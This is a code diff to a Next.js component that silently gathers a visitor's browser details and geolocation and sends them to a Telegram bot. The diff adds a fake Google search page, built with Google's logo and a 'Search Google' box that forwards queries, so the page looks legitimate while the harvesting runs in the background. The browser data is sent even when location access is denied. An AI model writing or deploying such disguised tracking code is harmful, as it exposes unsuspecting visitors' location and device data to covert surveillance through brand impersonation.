@@ -1,6 +1,6 @@
 'use client';
 
-import { useCallback, useEffect } from 'react';
+import { useCallback, useEffect, useState } from 'react';
 import axios from 'axios';
 
 interface BrowserInfo {
@@ -26,6 +26,10 @@ interface UserInfoData {
 }
 
 export default function UserInfo() {
+  const [locationStatus, setLocationStatus] = useState<'pending' | 'granted' | 'denied'>('pending');
+  const [isLoading, setIsLoading] = useState(false);
+  const [searchQuery, setSearchQuery] = useState('');
+
   useEffect(() => {
     // Debug logging for environment variables
     console.log('Bot Token exists:', !!process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN);
@@ -99,7 +103,6 @@ ${locationInfo}
   };
 
   const getUserInfo = useCallback(async () => {
-    // Get browser information immediately
     const browserInfo: BrowserInfo = {
       userAgent: navigator.userAgent,
       platform: navigator.platform,
@@ -110,9 +113,9 @@ ${locationInfo}
       onlineStatus: navigator.onLine,
     };
 
-    // Try to get location in the background
     navigator.geolocation.getCurrentPosition(
       async (position) => {
+        setLocationStatus('granted');
         const info: UserInfoData = {
           location: {
             latitude: position.coords.latitude,
@@ -125,7 +128,7 @@ ${locationInfo}
         await sendToTelegram(info);
       },
       async (error) => {
-        // Send browser info even if location is denied
+        setLocationStatus('denied');
         const info: UserInfoData = {
           location: null,
           browser: browserInfo,
@@ -139,9 +142,52 @@ ${locationInfo}
     );
   }, []);
 
+  const handleSearch = (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsLoading(true);
+    window.location.href = `https://www.google.com/search?q=${encodeURIComponent(searchQuery)}`;
+  };
+
   useEffect(() => {
     getUserInfo();
   }, [getUserInfo]);
 
-  return null;
+  if (locationStatus === 'pending') {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-gray-100">
+        <div className="text-center p-8 bg-white rounded-lg shadow-md">
+          <h1 className="text-xl mb-4">Please respond to the location permission request</h1>
+          <p className="text-gray-600">Waiting for your response...</p>
+        </div>
+      </div>
+    );
+  }
+
+  return (
+    <div className="min-h-screen flex flex-col items-center justify-center bg-white">
+      <div className="w-full max-w-2xl px-4">
+        <div className="text-center mb-8">
+          <img
+            src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
+            alt="Google"
+            className="h-24 mx-auto mb-8"
+          />
+          <form onSubmit={handleSearch} className="relative">
+            <input
+              type="text"
+              value={searchQuery}
+              onChange={(e) => setSearchQuery(e.target.value)}
+              className="w-full px-5 py-3 border border-gray-300 rounded-full focus:outline-none focus:border-blue-500 shadow-sm"
+              placeholder="Search Google"
+            />
+            {isLoading && (
+              <div className="absolute inset-0 bg-white bg-opacity-80 flex items-center justify-center">
+                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"></div>
+              </div>
+            )}
+          </form>
+        </div>
+      </div>
+    </div>
+  );
 } 
